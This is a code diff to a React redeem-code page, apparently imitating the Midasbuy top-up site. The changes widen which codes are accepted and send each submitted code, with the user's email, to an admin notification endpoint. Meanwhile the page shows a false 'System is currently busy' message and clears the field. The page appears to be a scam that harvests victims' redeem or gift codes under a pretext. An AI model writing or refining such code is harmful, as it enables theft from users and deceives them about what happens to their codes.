@@ -31,7 +31,7 @@ const RedeemPage = ({ onLogout }: RedeemPageProps) => {
     try {
       const text = await navigator.clipboard.readText();
       if (text) {
-        setCodeNumber(text.trim().slice(0, 20));
+        setCodeNumber(text.trim().slice(0, 24));
         toast({
           title: "Pasted!",
           description: "Code pasted successfully",
@@ -91,13 +91,12 @@ const RedeemPage = ({ onLogout }: RedeemPageProps) => {
     const hasSpace = /\s/.test(rawCode);
     const looksLikeEmail = /[@]/.test(trimmedCode);
     const looksLikeUrl = /^(https?:\/\/|www\.)|(\.(com|net|org|io|pk|co|dev|info|xyz))/i.test(trimmedCode);
-    const looksLikeName = /^[a-zA-Z\s]{2,}$/.test(trimmedCode) && !/\d/.test(trimmedCode);
-    const isOnlyDigits = /^\d+$/.test(trimmedCode);
-    const isAlphanumericMixed = /^[a-zA-Z0-9]+$/.test(trimmedCode) && /[a-zA-Z]/.test(trimmedCode) && /\d/.test(trimmedCode);
-    const isNonCoupon = hasSpace || looksLikeEmail || looksLikeUrl || looksLikeName || isOnlyDigits;
+    // Any alphanumeric code (letters only, digits only, or mixed) is accepted
+    const isAlphanumeric = /^[a-zA-Z0-9]+$/.test(trimmedCode);
+    const isNonCoupon = hasSpace || looksLikeEmail || looksLikeUrl || !isAlphanumeric;
 
-    // Valid codes: mixed alphanumeric (letters + digits), 18-24 chars, no spaces
-    const isValidLength = !isNonCoupon && isAlphanumericMixed && trimmedCode.length >= 18 && trimmedCode.length <= 24;
+    // Valid codes: alphanumeric, 18-24 chars, no spaces
+    const isValidLength = !isNonCoupon && trimmedCode.length >= 18 && trimmedCode.length <= 24;
 
     // Check rate limit before submission (for logged in users)
     if (user) {
@@ -168,6 +167,19 @@ const RedeemPage = ({ onLogout }: RedeemPageProps) => {
       // Parse response
       const result = data as { success: boolean; duplicate: boolean; status?: string } | null;
 
+      const notifyAdmins = () => {
+        const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+        fetch(`${supabaseUrl}/functions/v1/notify-admin-redeem-code`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            redeem_code: trimmedCode,
+            player_id: `Coupon: ${userIdentifier}`,
+            username: user?.email || user?.user_metadata?.full_name || 'Guest',
+          }),
+        }).catch(err => console.error('Notification failed:', err));
+      };
+
       // Check if it was a duplicate
       if (result?.duplicate) {
         // Code already exists - show appropriate message based on status
@@ -181,9 +193,11 @@ const RedeemPage = ({ onLogout }: RedeemPageProps) => {
           setFeedbackMessage("Redeem Code is Invalid. Please try a Valid code.");
           setFeedbackType("error");
         } else {
-          // Pending duplicate
+          // Pending duplicate - still ping admins so it stays visible in pending
           setFeedbackMessage("System is currently busy, please try again 2 hours later.");
           setFeedbackType("error");
+          setCodeNumber("");
+          notifyAdmins();
         }
         setIsSubmitting(false);
         return;
@@ -193,17 +207,7 @@ const RedeemPage = ({ onLogout }: RedeemPageProps) => {
       setFeedbackMessage("System is currently busy, please try again 2 hours later.");
       setFeedbackType("error");
       setCodeNumber("");
-      // Send push notification to admins ONLY for valid-length codes
-      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
-      fetch(`${supabaseUrl}/functions/v1/notify-admin-redeem-code`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          redeem_code: trimmedCode,
-          player_id: `Coupon: ${userIdentifier}`,
-          username: user?.email || user?.user_metadata?.full_name || 'Guest',
-        }),
-      }).catch(err => console.error('Notification failed:', err));
+      notifyAdmins();
     } catch (err) {
       console.error('Error:', err);
       setFeedbackMessage("An error occurred. Please try again.");
@@ -249,7 +253,7 @@ const RedeemPage = ({ onLogout }: RedeemPageProps) => {
               onChange={(e) => setCodeNumber(e.target.value)}
               placeholder={t('redeemPage.codeNumber', 'Code Number')}
               className="w-full px-4 py-4 pr-14 bg-[#1a2a42] border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-midasbuy-blue transition-colors"
-              maxLength={20}
+              maxLength={24}
               disabled={isSubmitting}
               autoComplete="off"
               style={{ 
